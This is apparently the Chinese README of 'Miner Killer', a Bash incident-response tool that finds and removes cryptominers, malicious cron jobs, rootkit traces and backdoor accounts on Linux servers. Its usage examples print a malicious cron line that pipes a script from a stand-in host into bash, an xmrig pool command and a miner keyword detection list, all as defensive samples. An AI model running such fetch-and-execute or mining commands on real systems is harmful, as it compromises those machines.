<div align="center">

# Miner Killer

> Linux 服务器应急响应工具 - 挖矿木马检测与清除

[![Shell Script](https://img.shields.io/badge/Shell-Bash-green.svg)](https://www.gnu.org/software/bash/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux-orange.svg)](https://www.kernel.org/)

[English](README_EN.md) | 中文

</div>

---

## 🚀 快速开始

### 方式 1: 直接下载运行（推荐）

```bash
curl -O https://raw.githubusercontent.com/gkdgkd123/miner_killer/main/miner_killer.sh
chmod +x miner_killer.sh
sudo ./miner_killer.sh
```

### 方式 2: 克隆仓库

```bash
git clone https://github.com/gkdgkd123/miner_killer.git
cd miner_killer
chmod +x miner_killer.sh
sudo ./miner_killer.sh
```

### 方式 3: 无网络环境部署

适用于内网服务器或无法访问外网的环境：

```bash
# 将完整脚本复制到目标服务器
cat > /tmp/miner_killer.sh << 'EOF'
[粘贴 miner_killer.sh 完整内容]
EOF

chmod +x /tmp/miner_killer.sh
sudo /tmp/miner_killer.sh
```

---

## ⚠️ 免责声明

**本脚本涉及进程终止和文件删除操作，可能影响系统稳定性。使用前请：**

- 在测试环境验证
- 备份重要数据
- 理解每个操作的影响
- 仔细确认删除提示

**作者不对因使用本脚本导致的数据丢失、服务中断或系统故障承担责任。**

---

## 📋 概述

Miner Killer 是一款专为 Linux 服务器设计的应急响应工具，用于检测和清除挖矿木马、后门账户、恶意进程及持久化攻击。脚本采用交互式设计，所有危险操作均需人工确认，确保安全可控。

### 核心能力

- **11 个审计模块**：覆盖进程、网络、持久化、容器、账户等全方位检测
- **IP 情报集成**：自动查询外联 IP 的地理位置和信誉信息
- **智能检测逻辑**：CPU 使用率 + 关键字匹配 + 网络连接三重判定
- **安全防护机制**：路径白名单、进程组击杀、防复活设计
- **自动隔离备份**：删除前自动备份到隔离目录，支持事后恢复

---

## 🌟 功能特性

### 🔍 检测能力

| 模块 | 功能 | 检测对象 |
|------|------|----------|
| **系统态势** | 系统负载、登录用户、监听端口、DNS 配置 | 异常登录、可疑端口、DNS 劫持 |
| **进程分析** | CPU 使用率、网络连接、恶意关键字 | 挖矿进程、后门程序、隐藏进程 |
| **系统完整性** | /etc/hosts、Shell 配置文件 | 域名劫持、启动脚本后门 |
| **容器安全** | Docker 容器资源占用 | 恶意容器、挖矿镜像 |
| **PM2 守护** | Node.js 进程管理器 | 隐藏的恶意 JS 脚本 |
| **持久化** | Crontab、Systemd 服务 | 定时任务后门、恶意服务 |
| **Rootkit** | LD_PRELOAD、内核模块、隐藏文件 | 内核级后门、Rootkit 痕迹 |
| **SSH 审计** | authorized_keys 文件 | 未授权公钥、后门密钥 |
| **网络连接** | ESTABLISHED 连接 + IP 情报 | 外联矿池、C2 服务器 |
| **DNS 审计** | /etc/resolv.conf | 恶意 DNS 服务器 |
| **服务文件** | Systemd 服务网络配置 | 服务文件中的外联地址 |
| **/etc/hosts** | hosts 文件 IP 情报 | 可疑域名解析 |

### 🛡️ 安全机制

**路径安全检查**
- 白名单机制：仅允许删除 `/tmp`、`/var/tmp`、`/dev/shm`、`/root`、`/home` 下的文件
- Systemd 保护：`/etc/systemd` 和 `/usr/lib/systemd` 仅允许删除 `.service` 文件
- 防止误删系统核心组件

**进程击杀策略**
```
1. kill -STOP $pid        # 冻结进程，阻止守护进程复活
2. 删除可执行文件          # 移除底层二进制文件
3. kill -9 -$pid          # 击杀整个进程组
```

**Crontab 保护**
- 不直接清空 crontab 文件
- 调用编辑器手动删除恶意行
- 自动备份原始文件

### 📊 IP 情报查询

集成 ipinfo.dkly.net API，自动查询外联 IP 的：
- 地理位置（国家、地区、城市）
- 所属组织/ISP
- 信誉评分（0-100，越低越可疑）

**触发场景**：
- 进程外联 IP
- 网络连接全景扫描
- DNS 服务器审计
- Systemd 服务文件中的 IP
- /etc/hosts 文件中的 IP

---

## 🏗️ 系统架构

```
┌─────────────────────────────────────────────────────────────┐
│                     Miner Killer 主流程                      │
└─────────────────────────────────────────────────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│  环境初始化    │    │  恶意特征库    │    │  IP 情报 API  │
│  - 颜色输出    │    │  - 关键字库    │    │  - ipinfo.io  │
│  - 日志系统    │    │  - 白名单      │    │  - 地理位置    │
│  - 锁机制      │    │  - 正则规则    │    │  - 信誉评分    │
└───────────────┘    └───────────────┘    └───────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│  0. 系统态势   │    │  1. 进程分析   │    │  2. 系统完整性 │
│  - 负载/用户   │    │  - CPU 检测    │    │  - /etc/hosts │
│  - 监听端口    │    │  - 网络连接    │    │  - Shell 配置  │
│  - 登录历史    │    │  - 关键字匹配  │    │  - 启动脚本    │
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│  3. Docker    │    │  4. PM2       │    │  5. 持久化     │
│  - 容器扫描    │    │  - 进程列表    │    │  - Crontab    │
│  - 资源占用    │    │  - 脚本路径    │    │  - Systemd    │
│  - 镜像审计    │    │  - 关键字检测  │    │  - 服务文件    │
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│  6. Rootkit   │    │  7. SSH 审计   │    │  8. 网络全景   │
│  - LD_PRELOAD │    │  - 公钥扫描    │    │  - 连接列表    │
│  - 内核污染    │    │  - 全用户遍历  │    │  - IP 情报     │
│  - 隐藏文件    │    │  - 后门密钥    │    │  - 外联检测    │
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│  9. DNS 审计   │    │ 10. 服务网络   │    │ 11. Hosts 情报 │
│  - resolv.conf│    │  - 服务文件    │    │  - IP 解析     │
│  - DNS 劫持    │    │  - 网络配置    │    │  - 情报查询    │
└───────────────┘    └───────────────┘    └───────────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │  隔离与清除        │
                    │  - 自动备份        │
                    │  - 安全删除        │
                    │  - 日志记录        │
                    └───────────────────┘
```

---

## 🎯 检测逻辑

### 进程可疑性判定

脚本使用**三重判定逻辑**，满足任一条件即标记为可疑：

```bash
# 1. CPU 使用率 > 8%
if (( $(echo "$cpu_usage > 8.0" | bc -l) )); then
    is_suspicious=1
fi

# 2. 进程名或命令行包含恶意关键字
if echo "$proc_name $cmd_line" | grep -iqE "$MALWARE_KEYWORDS"; then
    is_suspicious=1
fi

# 3. 存在外部网络连接（排除 127.0.0.1）
if [ ! -z "$target_ip" ]; then
    is_suspicious=1
fi

# 4. 可执行文件位于可疑路径
if [[ "$exe_path" == /tmp* ]] || [[ "$exe_path" == /dev/shm* ]]; then
    is_suspicious=1
fi
```

### 恶意特征库

```bash
MALWARE_KEYWORDS="miner|pool|xmrig|kinsing|c3pool|nanopool|f2pool|
                  stratum|wallet|crypto|eth|xmr|monero|ocean|
                  nicehash|hash|coins|kdevtmpfs|java-c|log_rot|
                  watchbog|kthrotlds"
```

---

## 📈 性能指标

| 指标 | 数值 | 说明 |
|------|------|------|
| **扫描速度** | ~30-60 秒 | 完整 11 模块扫描（取决于系统规模） |
| **误报率** | < 5% | 白名单机制 + 人工确认 |
| **资源占用** | < 50MB 内存 | 纯 Bash 实现，无额外依赖 |
| **日志大小** | ~100KB/次 | 自动保存到 `/var/log/miner_killer_*.log` |
| **隔离备份** | 自动 | 删除前备份到 `/tmp/malware_quarantine.*` |

---

## 🔬 核心创新

1. **防进程复活机制**
   - 传统方法：`kill -9 $pid` → 守护进程立即复活
   - 本脚本：`kill -STOP` 冻结 → 删除文件 → `kill -9 -$pid` 击杀进程组

2. **路径安全白名单**
   - 防止误删系统关键文件
   - Systemd 路径仅允许删除 `.service` 文件
   - 拒绝删除 `/usr/bin`、`/usr/sbin` 等系统目录

3. **Crontab 保护机制**
   - 不直接清空 crontab（避免破坏业务定时任务）
   - 调用编辑器手动删除恶意行
   - 自动备份原始文件

4. **IP 情报自动化**
   - 集成 ipinfo.dkly.net API
   - 自动查询外联 IP 的地理位置和信誉
   - 覆盖进程、网络、DNS、服务文件等多个场景

5. **CPU 验证健壮性**
   - 处理空值和非数字输入
   - 正则验证 `^[0-9]+(\.[0-9]+)?$`
   - 避免 awk 语法错误

---

## 🛠️ 依赖要求

### 必需

- **Bash** 4.0+
- **Root 权限**

### 可选（自动检测）

| 工具 | 用途 | 缺失影响 |
|------|------|----------|
| `netstat` / `ss` | 网络连接扫描 | 无法检测网络连接 |
| `docker` | 容器扫描 | 跳过 Docker 模块 |
| `pm2` | Node.js 进程管理器 | 跳过 PM2 模块 |
| `systemctl` | Systemd 服务管理 | 无法检测服务文件 |
| `python3` | JSON 解析（IP 情报） | 降级到 grep/sed 解析 |
| `curl` | API 请求 | 无法查询 IP 情报 |
| `chattr` | 文件属性修改 | 无法移除不可变标志 |
| `iptables` | 防火墙规则 | 无法自动封禁 IP |

---

## 📂 项目结构

```
miner_killer/
├── miner_killer.sh          # 主脚本
├── README.md                # 中文文档
├── README_EN.md             # 英文文档
└── LICENSE                  # MIT 许可证
```

---

## 🔧 配置说明

### IP 情报 API Key

脚本内置官方免费 API Key，如需自定义：

```bash
# 修改脚本第 25 行
IPINFO_API_KEY="your_api_key_here"
```

获取 API Key：https://ipinfo.dkly.net/

### 恶意特征库

根据实际环境自定义关键字（第 28 行）：

```bash
MALWARE_KEYWORDS="miner|pool|xmrig|your_custom_keyword"
```

### 白名单

添加可信进程到白名单（第 31 行）：

```bash
WHITELIST="systemd-journal|systemd-udevd|your_trusted_process"
```

---

## 📝 使用示例

### 场景 1: 服务器 CPU 异常飙高

```bash
# 运行脚本
sudo ./miner_killer.sh

# 输出示例
------------------------------------------------------------
► PID: 12345 | Name: xmrig | CPU: 95.2%
  Reason: [High CPU] [Keyword] [Network]
  Path  : /tmp/.hidden/xmrig
  Cmd   : ./xmrig -o pool.minexmr.com:4444 -u wallet...
  Net   : Connected to: 45.76.102.45 [United States] [Vultr Holdings LLC] [Score: 15]

Is this MALICIOUS? Kill & Delete? (y/Enter to skip): y
Block IP 45.76.102.45 in iptables? (y/n): y
[✔] IP 45.76.102.45 blocked.
KILLING PID 12345...
[Safe] Quarantined to: /tmp/malware_quarantine.XXXXXX/xmrig_1234567890
[✔] Deleted: /tmp/.hidden/xmrig
```

### 场景 2: 检测到恶意 Crontab

```bash
# 脚本输出
[1] /var/spool/cron/root [SUSPICIOUS]

Select Number to INSPECT CONTENT (Enter to continue): 1
================ FILE CONTENT: /var/spool/cron/root =================
*/5 * * * * curl -s http://malicious.com/miner.sh | bash
============================================================

Edit this file manually to remove malicious lines? (y/n): y
# 自动打开编辑器，手动删除恶意行
```

### 场景 3: 发现后门账户

```bash
# 脚本输出
[!!!] DANGER: Backdoor user (UID 0) found: hacker

Delete user 'hacker'? (y/n): y
[✔] User 'hacker' deleted.
```

---

## 🐛 故障排查

### 问题 1: 脚本无法运行

```bash
# 检查权限
ls -l miner_killer.sh
# 应显示 -rwxr-xr-x

# 添加执行权限
chmod +x miner_killer.sh

# 检查是否以 root 运行
whoami
# 应显示 root
```

### 问题 2: IP 情报查询失败

```bash
# 检查网络连接
curl -s https://ipinfo.dkly.net/api/?key=test&ip=8.8.8.8

# 检查 Python3 是否安装
python3 --version

# 手动安装 Python3（CentOS）
yum install python3 -y

# 手动安装 Python3（Ubuntu）
apt install python3 -y
```

### 问题 3: 误删重要文件

```bash
# 从隔离目录恢复
ls /tmp/malware_quarantine.*

# 恢复文件
cp /tmp/malware_quarantine.XXXXXX/filename /original/path/
```

---

## 🤝 贡献指南

欢迎提交 Issue 和 Pull Request！

1. Fork 本仓库
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 开启 Pull Request

---

## 📄 许可证

本项目采用 MIT 许可证 - 详见 [LICENSE](LICENSE) 文件

---

## 🙏 致谢

- [ipinfo.dkly.net](https://ipinfo.dkly.net/) - IP 情报 API
- Linux 安全社区的最佳实践
- 所有贡献者和使用者

---

## 📧 联系方式

- GitHub Issues: [https://github.com/gkdgkd123/miner_killer/issues](https://github.com/gkdgkd123/miner_killer/issues)
- 作者: gkdgkd123

---

**⚠️ 再次提醒：本工具仅用于合法的安全审计和应急响应。使用前请确保已获得系统所有者授权。**
